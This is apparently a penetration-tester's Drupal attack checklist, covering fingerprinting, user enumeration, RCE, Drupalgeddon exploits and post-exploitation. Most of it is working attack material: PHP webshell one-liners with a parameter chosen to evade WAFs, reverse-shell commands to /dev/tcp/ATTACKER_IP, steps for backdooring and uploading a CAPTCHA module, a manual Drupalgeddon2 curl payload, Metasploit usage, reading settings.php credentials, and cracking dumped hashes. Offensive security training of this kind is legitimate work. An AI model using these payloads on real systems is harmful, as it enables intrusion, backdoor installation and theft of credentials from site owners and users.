# Drupal Methodology

---

## 1. Discovery & Fingerprinting

- [ ] Check for Drupal indicators in page source:
```bash
curl -s http://TARGET | grep -i 'drupal\|sites/default\|drupal.js'
```

- [ ] Look for generator meta tag:
```bash
curl -s http://TARGET | grep 'name="Generator"'
# Example output: <meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

- [ ] Grab exact version from default files:
```bash
# Drupal 7
curl -s http://TARGET/CHANGELOG.txt | head -5
curl -s http://TARGET/README.txt | head -5

# Drupal 8+
curl -s http://TARGET/core/CHANGELOG.txt | head -5
curl -s http://TARGET/core/INSTALL.txt | head -5
```

- [ ] Probe Drupal content paths:
```bash
curl -s -o /dev/null -w "%{http_code}" http://TARGET/node/1
curl -s -o /dev/null -w "%{http_code}" http://TARGET/node/2
curl -s -o /dev/null -w "%{http_code}" http://TARGET/user/login
curl -s -o /dev/null -w "%{http_code}" http://TARGET/admin
```

- [ ] Check for custom 403/404 pages with Drupal styling (powered by Drupal footer, Drupal CSS classes)

- [ ] Run droopescan for automated enumeration:
```bash
droopescan scan drupal -u http://TARGET
# Enumerates: version, plugins, themes, interesting URLs
```

- [ ] Enumerate users:
```bash
# Drupal exposes user profiles at /user/N
for i in $(seq 1 20); do
  echo -n "user/$i: "
  curl -s http://TARGET/user/$i | grep '<title>' | sed 's/<[^>]*>//g'
done
```

- [ ] Check for exposed configuration/info files:
```bash
curl -s http://TARGET/sites/default/settings.php    # usually 403 but confirms Drupal
curl -s http://TARGET/xmlrpc.php
curl -s http://TARGET/update.php
curl -s http://TARGET/install.php
curl -s http://TARGET/cron.php
```

---

## 2. User Types & Permissions

| Role | Capabilities |
|------|-------------|
| Administrator | Full control — install modules, edit templates, manage users, run updates |
| Authenticated User | Limited access — depends on role permissions configured by admin |
| Anonymous | Public-facing — default minimal access, can view published content |

> Always check permissions at `/admin/people/permissions` if you have admin access. Misconfigurations here are common — authenticated users sometimes get module install or content type admin rights.

---

## 3. Authenticated RCE — PHP Filter Module (Drupal 7 / < 8)

**Prerequisite:** Admin credentials

- [ ] Navigate to Modules page: `http://TARGET/admin/modules`
- [ ] Enable PHP Filter module: check the box next to "PHP filter" → Save configuration
- [ ] Create new content: Content → Add content → Basic page
- [ ] Set Title to anything (e.g., `test`)
- [ ] Set Body to:
```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```
- [ ] Change Text format dropdown to **PHP code**
- [ ] Save the page — note the node path (e.g., `/node/3`)
- [ ] Trigger command execution:
```bash
# Test with id
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# Read /etc/passwd
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/etc/passwd"

# Reverse shell
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" "http://TARGET/node/3"
```

> The GET parameter name is an MD5 hash used as an obscure parameter name to avoid WAF detection. Use any parameter name you want.

---

## 4. Authenticated RCE — PHP Module Install (Drupal 8+)

**Prerequisite:** Admin credentials. PHP Filter was removed from Drupal 8 core — you must install it manually.

- [ ] Download the PHP module:
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

- [ ] Upload via web UI: Manage → Extend → **+ Install new module** → Browse → select `php-8.x-1.1.tar.gz` → Install
- [ ] Enable the module: Manage → Extend → search for "PHP Filter" → check the box → Install
- [ ] Grant permissions: Manage → People → Permissions → find "Use the PHP code text format" → check for your role → Save
- [ ] Create content with PHP code (same as Section 3):
```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```
- [ ] Set text format to **PHP code**, save, and trigger:
```bash
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

---

## 5. Authenticated RCE — Backdoored Module Upload

**Prerequisite:** Admin credentials. Works on any Drupal version that allows module installation.

- [ ] Download a legitimate module (CAPTCHA is small and common):
```bash
# Drupal 8+
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

# Drupal 7
wget https://ftp.drupal.org/files/projects/captcha-7.x-1.7.tar.gz
```

- [ ] Extract:
```bash
tar xzf captcha-8.x-1.2.tar.gz
```

- [ ] Create webshell inside the module directory:
```bash
cat > captcha/shell.php << 'EOF'
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
EOF
```

- [ ] Create .htaccess to ensure PHP execution:
```bash
cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF
```

- [ ] Repackage the module:
```bash
tar czf captcha-backdoor.tar.gz captcha/
```

- [ ] Upload: Manage → Extend → **+ Install new module** → Browse → select `captcha-backdoor.tar.gz` → Install

- [ ] Access the webshell:
```bash
# Drupal 8+ module path
curl -s "http://TARGET/modules/captcha/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# Drupal 7 module path (different location)
curl -s "http://TARGET/sites/all/modules/captcha/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

- [ ] Upgrade to reverse shell:
```bash
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" \
  "http://TARGET/modules/captcha/shell.php"
```

---

## 6. Drupalgeddon Exploits (Pre-Auth)

### Drupalgeddon — CVE-2014-3704 (Drupal 7.x < 7.32)

**Type:** Pre-auth SQL injection in the Drupal database abstraction API (form API expandArguments)

- [ ] Confirm vulnerable version:
```bash
curl -s http://TARGET/CHANGELOG.txt | head -1
# Must be Drupal 7.x where x < 32
```

- [ ] Find the exploit:
```bash
searchsploit drupal 7 sql
searchsploit -m 34992
```

- [ ] Run — creates a new admin user:
```bash
python2 34992.py -t http://TARGET -u admin2 -p pass123
```

- [ ] Login with new admin creds → proceed to authenticated RCE (Section 3 or 5)

- [ ] Alternative — Metasploit:
```bash
msfconsole -q
use exploit/multi/http/drupal_drupageddon
set RHOSTS TARGET
set RPORT 80
run
```

### Drupalgeddon2 — CVE-2018-7600 (Drupal < 7.58, 8.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1)

**Type:** Pre-auth RCE via Drupal Form API render array (#markup/#attached/#post_render)

- [ ] Confirm vulnerable version:
```bash
curl -s http://TARGET/CHANGELOG.txt | head -1     # Drupal 7
curl -s http://TARGET/core/CHANGELOG.txt | head -1 # Drupal 8
```

- [ ] Find the exploit:
```bash
searchsploit drupalgeddon2
searchsploit -m 44449
```

- [ ] Run — gives interactive shell:
```bash
ruby 44449.rb http://TARGET
```

- [ ] Alternative — Metasploit:
```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS TARGET
set RPORT 80
run
```

- [ ] Manual exploitation (Drupal 8 — POST to user/register):
```bash
curl -s 'http://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

### Drupalgeddon3 — CVE-2018-7602 (Authenticated RCE)

**Type:** Authenticated RCE — requires a valid session. Often chained after Drupalgeddon (CVE-2014-3704) to get creds first.

- [ ] Metasploit:
```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS TARGET
set RPORT 80
set DRUPAL_NODE 1
set DRUPAL_SESSION <session_cookie_value>
run
```

- [ ] Python exploit:
```bash
searchsploit drupalgeddon3
searchsploit -m 44542
python3 44542.py http://TARGET -c "id"
```

---

## 7. Post-Exploitation

- [ ] Grab database credentials:
```bash
cat /var/www/html/sites/default/settings.php
# Look for $databases array:
# $databases['default']['default'] = array(
#   'database' => 'drupal',
#   'username' => 'drupaluser',
#   'password' => 'password123',
#   'host' => 'localhost',
#   'driver' => 'mysql',
# );
```

- [ ] Common settings.php locations:
```bash
find / -name settings.php 2>/dev/null | grep drupal
# /var/www/html/sites/default/settings.php       (standard)
# /var/www/drupal/sites/default/settings.php     (custom)
```

- [ ] Connect to database and dump hashes:
```bash
mysql -u drupaluser -p'password123' drupal -e "SELECT uid, name, pass FROM users;"
```

- [ ] Drupal hash format:
  - Drupal 7: `$S$` prefix — iterated SHA-512 (use hashcat mode 7900)
  - Drupal 8+: bcrypt `$2y$` prefix (use hashcat mode 3200)

- [ ] Crack with hashcat:
```bash
# Drupal 7
hashcat -m 7900 drupal_hashes.txt /usr/share/wordlists/rockyou.txt

# Drupal 8
hashcat -m 3200 drupal_hashes.txt /usr/share/wordlists/rockyou.txt
```

- [ ] Check uploaded files for sensitive data:
```bash
ls -la /var/www/html/sites/default/files/
find /var/www/html/sites/default/files/ -name "*.bak" -o -name "*.sql" -o -name "*.conf" 2>/dev/null
```

- [ ] Look for private files directory (sometimes outside webroot):
```bash
grep -r 'file_private_path' /var/www/html/sites/default/settings.php
```

---

## 8. Decision Tree

```
Drupal Found
├── Get version → CHANGELOG.txt / droopescan
│
├── NO CREDS
│   ├── Drupal 7.x < 7.32
│   │   └── Drupalgeddon (CVE-2014-3704) → SQLi → create admin → Auth RCE
│   ├── Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1
│   │   └── Drupalgeddon2 (CVE-2018-7600) → direct pre-auth RCE
│   └── Patched / unknown version
│       └── Enumerate users → brute force → if admin obtained → Auth RCE
│
├── HAVE ADMIN CREDS
│   ├── Drupal 7 (< 8)
│   │   └── Enable PHP Filter module → create page with PHP code → webshell
│   ├── Drupal 8+
│   │   ├── Install PHP module from ftp.drupal.org → enable → webshell
│   │   └── Backdoored module upload (CAPTCHA) → webshell
│   └── Any version
│       ├── Backdoored module upload → webshell (most reliable)
│       └── Drupalgeddon3 (CVE-2018-7602) if applicable version
│
└── POST-EXPLOIT
    ├── settings.php → DB creds → dump user hashes → crack → password reuse
    ├── Check files directory for backups, SQL dumps
    └── Pivot to other services using recovered credentials
```

---

## Quick Reference — External Links

- [Drupal Security Advisories](https://www.drupal.org/security)
- [droopescan GitHub](https://github.com/SamJoan/droopescan)
- [CVE-2014-3704 — Drupalgeddon](https://www.exploit-db.com/exploits/34992)
- [CVE-2018-7600 — Drupalgeddon2](https://www.exploit-db.com/exploits/44449)
- [CVE-2018-7602 — Drupalgeddon3](https://www.exploit-db.com/exploits/44542)
- [HackTricks — Drupal](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal)
